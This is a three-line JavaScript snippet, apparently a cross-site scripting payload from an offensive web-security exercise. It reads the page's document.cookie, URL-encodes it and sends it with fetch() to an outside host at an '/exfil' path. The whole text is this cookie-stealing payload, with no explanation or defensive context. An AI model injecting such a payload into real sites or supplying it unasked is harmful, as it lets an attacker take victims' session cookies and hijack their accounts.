let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("oswa-scripts.vercel.app/exfil?data=" + encodedCookie)
